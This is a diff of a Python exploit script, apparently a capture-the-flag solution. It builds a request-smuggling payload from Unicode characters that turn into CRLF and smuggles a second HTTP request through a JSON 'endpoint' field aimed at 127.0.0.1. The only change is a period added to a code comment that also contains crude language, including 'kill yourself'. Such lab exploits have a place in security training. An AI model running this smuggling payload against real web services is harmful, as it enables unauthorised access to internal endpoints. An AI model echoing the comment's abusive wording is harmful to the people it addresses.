@@ -27,7 +27,7 @@ else:
     smuggle = '\u0120HTTP/1.1\u010D\u010AHost:\u0120' + host_to_smuggle + '\u010D\u010A\u010D\u010A' + Method + '\u0120/' + endpoint_to_smuggle + '\u0120HTTP/1.1\u010D\u010AHOST:\u0120' + host_to_smuggle + '\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str(content_length) +'\u010D\u010A\u010D\u010AGET\u0120/?Abuqasem=lol'
 
 """Sending payload"""
-Post_data = json={'endpoint': '127.0.0.1/'+ smuggle, 'city': 'chengdu', 'country': 'CN'} # Change (must be json to avoid unicode shit or send it by hand with burp then kill yourself)
+Post_data = json={'endpoint': '127.0.0.1/'+ smuggle, 'city': 'chengdu', 'country': 'CN'} # Change (must be json to avoid unicode shit or send it by hand with burp then kill yourself.)
 req = requests.post(url,data=Post_data , proxies=proxy)
 print("[@] Status Code: ", req.status_code)
 print("[@] Response Body ", req.text)
